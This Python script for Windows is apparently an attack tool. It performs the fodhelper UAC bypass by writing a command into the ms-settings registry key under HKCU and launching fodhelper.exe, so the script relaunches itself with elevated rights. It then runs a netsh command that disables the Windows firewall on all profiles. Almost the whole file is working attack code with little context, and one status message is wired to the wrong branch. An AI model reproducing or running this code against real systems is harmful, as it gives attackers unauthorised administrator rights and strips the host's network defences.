import os
import sys
import ctypes
import winreg
from pynput.keyboard import Key, Controller
keyboard = Controller()

CMD                   = r"\cmd.exe"
FOD_HELPER            = r'\fodhelper.exe'
PYTHON_CMD            = "python"
REG_PATH              = 'Software\Classes\ms-settings\shell\open\command'
DELEGATE_EXEC_REG_KEY = 'DelegateExecute'

def is_running_as_admin():
    '''
    Checks if the script is running with administrative privileges.
    Returns True if is running as admin, False otherwise.
    '''    
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False
    
def create_reg_key(key, value):
    '''
    Creates a reg key
    '''
    try:        
        winreg.CreateKey(winreg.HKEY_CURRENT_USER, REG_PATH)
        registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_PATH, 0, winreg.KEY_WRITE)                
        winreg.SetValueEx(registry_key, key, 0, winreg.REG_SZ, value)        
        winreg.CloseKey(registry_key)
    except WindowsError:        
        raise

def bypass_uac(cmd):
    '''
    Tries to bypass the UAC
    '''
    try:
        create_reg_key(DELEGATE_EXEC_REG_KEY, '')
        create_reg_key(None, cmd)    
    except WindowsError:
        raise

def execute():        
    if not is_running_as_admin():
       
        try:    

            current_dir = os.path.realpath(__file__) 
            cmd = '{} /k {} {}'.format(CMD, PYTHON_CMD, current_dir)
            bypass_uac(cmd)       
            print (current_dir)
            print (cmd)     
            os.system(FOD_HELPER)   
            
      
            
      
                         
        except WindowsError:

            sys.exit(1)
    else:
        print ('[!] The script is NOT running with administrative privileges')

def second():  
    os.system('netsh advfirewall set allprofiles state off')
    return 0



if __name__ == '__main__':
    execute()   
    second()